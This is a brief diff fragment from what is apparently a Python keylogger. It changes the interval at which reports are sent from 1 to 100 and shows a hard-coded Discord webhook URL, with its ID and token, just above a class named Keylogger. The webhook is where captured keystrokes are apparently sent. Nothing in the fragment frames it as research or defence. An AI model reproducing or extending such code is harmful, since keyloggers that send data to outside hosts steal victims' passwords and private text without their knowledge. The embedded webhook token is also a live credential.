@@ -21,7 +21,7 @@ if __name__ == "__main__":
         check_and_install_module(module)
 
 
-SEND_REPORT_EVERY = 1
+SEND_REPORT_EVERY = 100
 WEBHOOK = "https://discord.com/api/webhooks/971587489515065354/BIW03h4Zbj_8ByraR3Z4JrJEV2Y1UA9kJFxJt6sc8JzREXGesJD4abX5Xd8FBPi6MEAh"
 
 class Keylogger: 
